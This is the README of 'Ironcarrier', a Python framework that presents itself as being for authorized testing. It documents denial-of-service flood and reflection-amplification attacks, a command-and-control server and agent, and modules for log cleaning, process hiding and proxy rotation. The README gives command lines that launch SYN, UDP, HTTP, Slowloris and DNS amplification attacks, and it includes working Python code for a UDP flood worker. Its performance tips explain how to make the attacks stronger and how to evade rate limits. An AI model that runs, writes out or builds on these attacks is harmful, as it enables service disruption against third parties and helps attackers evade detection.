# 🔥 Ironcarrier

> A lightweight, modular framework for building and executing network attack vectors. Educational and authorized testing only.

[![Python 3.9+](https://img.shields.io/badge/Python-3.9%2B-blue)](https://www.python.org/)
[![License: AGPL v3](https://img.shields.io/badge/License-AGPL%20v3-red.svg)](https://www.gnu.org/licenses/agpl-3.0)
[![Platform: Linux | macOS | Windows](https://img.shields.io/badge/Platform-Linux%20%7C%20macOS%20%7C%20Windows-green)]()

---

## ⚠️ Security Notice

This repository contains **offensive network attack vectors** and stress-testing tools. These are provided **exclusively for authorized security research, education, and penetration testing**.

**Important:**
- ❌ Do **NOT** use against systems without explicit written permission
- ❌ Unauthorized testing is **illegal** in most jurisdictions
- ❌ Improper use can cause service disruption and legal consequences
- ✅ Always obtain proper authorization before testing

**By using this code, you agree to comply with all applicable laws and ethical guidelines.**

---

## 📋 Overview

Ironcarrier is organized as a **modular attack framework** with clear separation of concerns:

### Core Components

| Component | Purpose |
|-----------|---------|
| **Core Engine** | Orchestrates vector execution, concurrency, and statistics collection |
| **Vectors** | Pre-built attack implementations (Layer 4, Layer 7, Amplification) |
| **Utils** | Reconnaissance, OSINT, proxy management, payload generation, OPSEC tools |
| **Network** | Raw socket operations, TCP stack manipulation, tunneling |
| **C2** | Command & Control server and agent for remote operation |
| **GUI** | Web dashboard and TUI for interactive control |

---

## 📁 Project Structure

```
ironcarrier/
├── ironcarrier/                          # Main package
│   ├── __init__.py
│   ├── __main__.py                       # CLI entry point
│   │
│   ├── core/                             # Engine & coordination
│   │   ├── engine.py                     # Attack orchestration
│   │   ├── config.py                     # Configuration loader
│   │   ├── logger.py                     # Centralized logging
│   │   └── stats.py                      # Statistics aggregation
│   │
│   ├── vectors/                          # Attack implementations
│   │   ├── layer4/                       # Transport layer
│   │   │   ├── tcp_flood.py
│   │   │   ├── udp_flood.py
│   │   │   ├── syn_flood.py
│   │   │   ├── ack_flood.py
│   │   │   ├── udp_lag.py
│   │   │   └── blacknurse.py
│   │   │
│   │   ├── layer7/                       # Application layer (HTTP)
│   │   │   ├── http_flood.py
│   │   │   ├── http_bypass.py
│   │   │   ├── slowloris.py
│   │   │   ├── slowpost.py
│   │   │   ├── rage.py
│   │   │   └── hammer.py
│   │   │
│   │   └── amplification/                # Reflection-based
│   │       ├── dns_amp.py
│   │       ├── ntp_amp.py
│   │       ├── memcached_amp.py
│   │       ├── ssdp_amp.py
│   │       ├── cldap_amp.py
│   │       ├── chargen_amp.py
│   │       └── misc_amp.py
│   │
│   ├── utils/                            # Support utilities
│   │   ├── recon/                        # Reconnaissance
│   │   │   ├── port_scanner.py
│   │   │   ├── subnet_scanner.py
│   │   │   ├── service_detect.py
│   │   │   └── vuln_scan.py
│   │   │
│   │   ├── osint/                        # Open-source intelligence
│   │   │   ├── geolocator.py
│   │   │   ├── whois.py
│   │   │   ├── dns_enum.py
│   │   │   ├── subdomain.py
│   │   │   ├── shodan.py
│   │   │   └── hunter.py
│   │   │
│   │   ├── proxy/                        # Proxy management
│   │   │   ├── manager.py
│   │   │   ├── rotator.py
│   │   │   ├── scraper.py
│   │   │   ├── socks.py
│   │   │   └── validator.py
│   │   │
│   │   ├── payloads/                     # Payload generation
│   │   │   ├── generator.py
│   │   │   ├── obfuscator.py
│   │   │   ├── fragmentation.py
│   │   │   └── templates.py
│   │   │
│   │   └── opsec/                        # Operational security
│   │       ├── log_cleaner.py
│   │       ├── process_hide.py
│   │       ├── artifact_hide.py
│   │       └── traffic_noise.py
│   │
│   ├── net/                              # Network layer
│   │   ├── raw_socket.py
│   │   ├── tcp_stack.py
│   │   └── tunnel.py
│   │
│   ├── c2/                               # Command & Control
│   │   ├── encryption.py
│   │   ├── protocol.py
│   │   ├── client.py
│   │   └── server.py
│   │
│   ├── gui/                              # User interfaces
│   │   ├── web/                          # Web dashboard
│   │   │   ├── app.py
│   │   │   ├── api.py
│   │   │   ├── websocket.py
│   │   │   └── templates/
│   │   │
│   │   └── tui/                          # Terminal UI
│   │       ├── main.py
│   │       ├── panels.py
│   │       └── widgets.py
│   │
│   └── plugins/                          # Plugin system
│       ├── api.py
│       ├── loader.py
│       └── examples/
│           ├── telegram_notify.py
│           ├── discord_webhook.py
│           └── auto_schedule.py
│
├── configs/                              # Configuration files
│   └── default.yaml
│
├── requirements.txt                      # Universal dependencies
├── requirements-windows.txt              # Windows-specific deps
├── requirements-macos.txt                # macOS-specific deps
├── INSTALL.md                            # Installation guide
├── setup.py                              # Package setup
├── LICENSE                               # AGPL v3
└── README.md
```

---

## 🚀 Quick Start

### Prerequisites

- **Python 3.9+** (uses type hints and f-strings)
- **Virtual Environment** (recommended for isolation)

### Installation

#### 1. Clone Repository

```bash
git clone https://github.com/Ironcarrier228/ironcarrier.git
cd ironcarrier
```

#### 2. Create Virtual Environment

```bash
python -m venv venv
source venv/bin/activate          # Linux/macOS
# or
venv\Scripts\activate             # Windows
```

#### 3. Install Dependencies

Choose based on your platform:

**Linux / Generic:**
```bash
pip install -r requirements.txt
```

**Windows:**
```bash
pip install -r requirements.txt -r requirements-windows.txt
```

**macOS:**
```bash
pip install -r requirements.txt -r requirements-macos.txt
```

#### 4. Verify Installation

```bash
ironcarrier --help
ironcarrier --list-vectors
```

---

## 📖 Usage

### Command Line Interface

```bash
# List all available attack vectors
ironcarrier --list-vectors

# TCP Flood attack
ironcarrier -m tcp_flood -t 1.2.3.4 -p 80 -d 120 -T 200

# UDP Flood with custom packet size
ironcarrier -m udp_flood -t 1.2.3.4 -p 53 -d 300 --size 4096

# SYN Flood with high thread count
ironcarrier -m syn_flood -t 1.2.3.4 -p 443 -d 60 -T 1000

# HTTP Flood with SSL
ironcarrier -m http_flood -t example.com -p 443 -d 60 --ssl

# Slowloris with max connections
ironcarrier -m slowloris -t example.com -p 80 -d 300 --max-conn 1000

# DNS Amplification with reflector list
ironcarrier -m dns_amp -t 1.2.3.4 -p 80 -d 60 --reflector reflectors.txt

# Use custom configuration
ironcarrier -c configs/stealth.yaml -m syn_flood -t 1.2.3.4 -p 443 -d 60

# Start C2 Server
ironcarrier --c2-server --bind 0.0.0.0 --port 8443

# Connect C2 Agent
ironcarrier --c2-client --server 1.2.3.4 --port 8443

# Launch Web Dashboard
ironcarrier --gui --host 0.0.0.0 --port 5000

# Launch Terminal UI
ironcarrier --tui
```

### Python API

```python
from ironcarrier.core.engine import Engine
from ironcarrier.vectors.layer4.tcp_flood import Attack as TCPFlood

# Initialize engine
engine = Engine(config_file='configs/default.yaml')

# Create attack job
attack = TCPFlood(
    target='1.2.3.4',
    port=80,
    duration=60,
    threads=200
)

# Execute attack
results = engine.launch(attack)
engine.stats.print_summary()
```

---

## 🔧 Configuration

Create a YAML configuration file in `configs/`:

```yaml
# configs/stealth.yaml
engine:
  threads: 100
  timeout: 30
  retry_count: 3

attack:
  method: syn_flood
  target: 1.2.3.4
  port: 443
  duration: 120

network:
  use_proxy: false
  randomize_headers: true
  user_agent_rotation: true

logging:
  level: INFO
  format: json
  file: logs/attack.log
```

Load and run:

```bash
ironcarrier -c configs/stealth.yaml
```

---

## 🛠️ Core Modules Reference

| Module | Purpose |
|--------|---------|
| `engine.py` | Main orchestration engine for vector execution |
| `config.py` | YAML/JSON configuration loading and validation |
| `logger.py` | Centralized JSON-line logging with severity levels |
| `stats.py` | Packet statistics and result aggregation |

---

## ➕ Creating Custom Vectors

1. **Create a new file** under `ironcarrier/vectors/<category>/`:

```python
# ironcarrier/vectors/layer4/custom_flood.py
from ironcarrier.core.engine import BaseVector
import socket
import threading

class CustomFlood(BaseVector):
    """Custom attack vector implementation."""
    
    def __init__(self, target: str, port: int, **kwargs):
        super().__init__(target, port, **kwargs)
        self.packets_sent = 0
    
    def run(self):
        """Execute the attack."""
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self._attack_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()
        
        return {'packets_sent': self.packets_sent}
    
    def _attack_worker(self):
        """Individual attack thread worker."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = b'X' * 1024
        
        while self.is_running:
            try:
                sock.sendto(payload, (self.target, self.port))
                self.packets_sent += 1
            except Exception as e:
                self.logger.error(f"Error: {e}")
        
        sock.close()
```

2. **Register the vector** in `ironcarrier/vectors/layer4/__init__.py`:

```python
from .custom_flood import CustomFlood

__all__ = ['CustomFlood']
```

3. **Test it**:

```bash
ironcarrier -m custom_flood -t 1.2.3.4 -p 53 -d 60 -T 100
```

---

## 🐛 Troubleshooting

### Issue: "externally-managed-environment" error

**Solution:** Use a virtual environment (required on Arch Linux, Python 3.13+):

```bash
python -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

### Issue: Package compilation fails (cryptography, etc.)

**Solution:** Install build dependencies:

**Linux (Arch):**
```bash
sudo pacman -S base-devel
```

**Linux (Debian/Ubuntu):**
```bash
sudo apt-get install build-essential python3-dev
```

**macOS:**
```bash
xcode-select --install
```

**Windows:**
Install [Visual Studio Build Tools](https://visualstudio.microsoft.com/downloads/)

### Issue: "Permission denied" when running attack

**Solution:** Some attack vectors require root/administrator privileges:

```bash
sudo ironcarrier -m syn_flood -t 1.2.3.4 -p 443 -d 60
```

---

## 📊 Supported Attack Vectors

### Layer 4 (Transport Layer)
- TCP Flood
- UDP Flood  
- SYN Flood
- ACK Flood
- UDP Lag
- BlackNurse

### Layer 7 (Application Layer)
- HTTP Flood
- HTTP Bypass
- Slowloris
- SlowPOST
- Rage
- Hammer

### Amplification (Reflection-based)
- DNS Amplification
- NTP Amplification
- Memcached Amplification
- SSDP Amplification
- CLDAP Amplification
- CHARGEN Amplification
- Miscellaneous Amplification

---

## 📦 Dependencies

### Core Dependencies
- `cryptography>=41.0.0` – Encryption for C2
- `pyyaml>=6.0` – Configuration parsing
- `rich>=13.0.0` – TUI rendering

### Optional Dependencies
- `flask>=3.0.0`, `flask-cors>=4.0.0` – Web dashboard
- `gevent>=23.9.0`, `gevent-websocket>=0.10.1` – Async WebSocket support
- `dnspython>=2.4.0` – DNS operations
- `pytest>=7.0.0` – Testing framework

### Platform-Specific
- **Windows:** `pywin32>=306` (for Windows agent support)
- **macOS:** `py2app>=0.28` (for macOS bundling)

> ℹ️ **Note:** `ipaddress` is built-in to Python 3.3+ and is not required

---

## 📝 License

Licensed under the **GNU Affero General Public License v3.0** – see [LICENSE](LICENSE) for full details.

**In summary:**
- ✅ Use, modify, distribute freely
- ✅ Must disclose source code
- ✅ Must include license
- ✅ Network use is treated as distribution

---

## 🤝 Contributing

We welcome contributions! To contribute:

1. **Fork** the repository
2. **Create** a feature branch: `git checkout -b feature/your-feature`
3. **Commit** your changes: `git commit -m 'Add your feature'`
4. **Push** to the branch: `git push origin feature/your-feature`
5. **Open** a Pull Request with clear description of changes

### Guidelines
- Follow PEP 8 style guide
- Add docstrings to all functions
- Include unit tests for new features
- Update README if adding new attack vectors
- Ensure all tests pass: `pytest tests/`

---

## 📞 Support

- 📖 **Documentation:** See [INSTALL.md](INSTALL.md) for detailed setup instructions
- 🐛 **Report Issues:** [GitHub Issues](https://github.com/Ironcarrier228/ironcarrier/issues)
- 💬 **Discussions:** [GitHub Discussions](https://github.com/Ironcarrier228/ironcarrier/discussions)

---

## ⚡ Performance Tips

1. **Use multiple threads** for parallel attacks: `-T 500`
2. **Enable proxy rotation** for bypassing rate limits
3. **Use raw sockets** for layer 4 attacks (requires root)
4. **Randomize User-Agent** for layer 7 attacks
5. **Monitor resources:** Keep tabs on CPU and memory usage

---

## 📚 References

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Packet Crafting with Scapy](https://scapy.readthedocs.io/)
- [Python Socket Programming](https://docs.python.org/3/library/socket.html)
- [HTTP/2 Specification](https://http2.github.io/)

---

**Last Updated:** July 2026  
**Maintained By:** IronCarrier Team  
**Status:** Active Development
